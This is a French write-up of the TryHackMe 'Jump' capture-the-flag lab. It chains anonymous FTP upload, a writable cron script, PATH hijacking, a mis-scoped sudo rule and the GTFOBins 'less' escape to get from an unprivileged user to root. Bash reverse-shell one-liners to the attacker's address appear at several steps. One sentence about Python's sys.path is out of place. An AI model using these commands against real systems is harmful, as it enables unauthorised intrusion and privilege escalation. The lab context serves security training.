---
title: "TryHackMe - Jump"
platform: "TryHackMe"
difficulty: "Easy"
tags: [linux,ftp,cron,path hijacking,privilege escalation,sudo,gtfobins]
---

## Résumé

Sur ce CTF l'objectif est de progresser depuis un accès anonyme à un serveur FTP jusqu'au compte root, en enchaînant une escalade à travers pas moins de 5 comptes utilisateurs différents, chacun exploité via une faiblesse de configuration distincte (permissions de groupe, cron writable, PATH hijacking, sudoers mal scopé, GTFOBins).

## Outils/Technos Utilisés

Reconnaissance :
- Nmap
- Client FTP

Accès Initial :
- FTP anonyme
- Netcat (listener reverse shell)
- Bash scripting

Elévation de privilèges :
- Permissions de groupe Linux
- Cron jobs
- PATH Hijacking
- Sudoers (NOPASSWD)
- GTFOBins
- Python (upgrade PTY)

## Reconnaissance

Un scan nmap sur la machine cible révèle deux services exposés :

```bash
nmap -sV -T4 <<target>>
Starting Nmap 7.80 ( https://nmap.org ) at <<date>>
Nmap scan report for <<target>>
Host is up.
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd
22/tcp open  ssh     OpenSSH
```

Le port FTP accepte les connexions anonymes, ce qui va être notre point d'entrée :

```bash
$ ftp <<target>>
Name: anonymous
Password:
230 Login successful.
```

## Exploitation initiale

Une fois connecté, on trouve un fichier README.txt à la racine du FTP :

```bash
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

Ce message indique qu'un processus tourne côté serveur et traite automatiquement tout fichier déposé dans le répertoire incoming/ (accessible en écriture pour l'utilisateur anonyme). Il suffit donc de déposer un script shell de reverse shell dans ce dossier pour qu'il soit exécuté automatiquement :

```bash
$ echo 'bash -i >& /dev/tcp/<<local_ip>>/4444 0>&1' > rvs.sh
ftp> cd incoming
ftp> put rvs.sh
```

On met en place un listener côté attaquant avant l'upload :

```bash
$ nc -lvnp 4444
```

Quelques instants après le dépôt, un callback arrive :

```bash
$ nc -lvnp 4444
connect to [<<local_ip>>] from (UNKNOWN) [<<target>>]
$ whoami
recon_user
```

## Élévation de privilèges

De recon_user à dev_user

Une énumération basique révèle que recon_user appartient à plusieurs groupes secondaires, en plus du sien :

```bash
$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

En cherchant les fichiers appartenant au groupe dev_user, on tombe sur un script cron writable par ce groupe :

```bash
$ find / -group dev_user 2>/dev/null
/opt/dev/backup.sh
/opt/dev/bin/ps
/home/dev_user/flag.txt
```

```bash
$ ls -la /opt/dev/backup.sh
-rwxrwxr-x 1 dev_user dev_user 60 ... /opt/dev/backup.sh

$ cat /opt/dev/backup.sh
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

Ce script (déclenché périodiquement par un cron) est writable par le groupe dev_user, dont recon_user fait partie. On y ajoute une ligne de reverse shell qui sera exécutée au prochain déclenchement :

```bash
$ echo 'bash -i >& /dev/tcp/<<local_ip>>/4445 0>&1' >> /opt/dev/backup.sh
```

Après quelques minutes d'attente, on obtient un shell en tant que dev_user :

```bash
$ nc -lvnp 4445
$ whoami
dev_user
```

De dev_user à monitor_user

L'énumération classique (sudo -l, SUID, capabilities, crontab) ne donne rien de nouveau pour cet utilisateur. En revanche, ps aux révèle un process tournant en continu depuis le démarrage, sous un compte encore jamais croisé :
Premièrement on va vérifier l'ordre de sys.path pour savoir quels sont les répertoires où la librairie 'import' va être recherché dans l'ordre de priorité :

```bash
$ ps aux | grep -v root
monitor_user   652  0.0  0.3  7748  3492 ?  Ss  ...  /bin/bash /usr/local/bin/healthcheck
monitor_user  4620  0.0  0.2  6120  2028 ?  S   ...  sleep 5
```

```bash
$ cat /usr/local/bin/healthcheck
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

Le script appelle ps sans chemin absolu, dans une boucle infinie qui tourne toutes les 5 secondes. Un fichier /opt/dev/bin/ps est déjà présent, appartenant à dev_user (donc modifiable pour nous) :

```bash
$ cat /opt/dev/bin/ps
#!/bin/bash
setsid bash -i >& /dev/tcp/<<old_ip>>/5557 0>&1
```

Ce fichier ressemble déjà à un payload de reverse shell, il suffit d'y remplacer l'IP par la nôtre. Si /opt/dev/bin fait bien partie du PATH utilisé par le service healthcheck (avant /usr/bin), notre faux binaire ps sera exécuté à la place du vrai dès la prochaine itération de la boucle :

```bash
$ sed -i 's/<<old_ip>>/<<local_ip>>/' /opt/dev/bin/ps
$ chmod +x /opt/dev/bin/ps
```

```bash
$ nc -lvnp 5557
$ whoami
monitor_user
```

De monitor_user à ops_user

```bash
$ sudo -l
User monitor_user may run the following commands on <<target>>:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

```bash
$ cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

Le script appelle un binaire en chemin relatif. Or deploy_helper.sh appartient justement à monitor_user :

```bash
$ ls -la /opt/app/
-rwxr-xr-x 1 monitor_user monitor_user 90 ... deploy_helper.sh
```

On le remplace par notre propre payload puis on déclenche le script via sudo :

```bash
$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<<local_ip>>/5558 0>&1' > /opt/app/deploy_helper.sh
$ chmod +x /opt/app/deploy_helper.sh
$ sudo -u ops_user /usr/local/bin/deploy.sh```
```

```bash
$ nc -lvnp 5558
$ whoami
ops_user
```

De ops_user à root

```bash
$ sudo -l
User ops_user may run the following commands on <<target>>:
    (root) NOPASSWD: /usr/bin/less
```

Un classique répertorié sur GTFOBins : une fois lancé, less permet d'exécuter une commande shell via !commande. La difficulté ici vient du fait qu'un reverse shell brut ne dispose pas d'un TTY complet, ce qui fait quitter less immédiatement (il se comporte alors comme cat). Il faut d'abord upgrader le shell :

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z côté attaquant
$ stty raw -echo; fg
$ export TERM=xterm
```

Une fois le TTY fonctionnel, less reste bien en mode pager interactif :

```bash
$ sudo /usr/bin/less /etc/hosts
```

Dans l'interface, on tape :

```bash
!/bin/bash
```

```bash
# whoami
root
```

## Conclusion

Ce CTF propose une chaîne de privesc originale, construite autour de comptes de service mal cloisonnés plutôt que de vulnérabilités logicielles classiques : permissions de groupe trop larges, cron job writable, PATH hijacking sur un script de monitoring, sudoers mal scopé, et pour finir un GTFOBins bien connu sur less. Ce qui m'a le plus marqué, c'est l'importance de bien énumérer les process en cours (ps aux) pour dénicher des comptes de service invisibles autrement (monitor_user) — un réflexe à ne jamais négliger.

Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
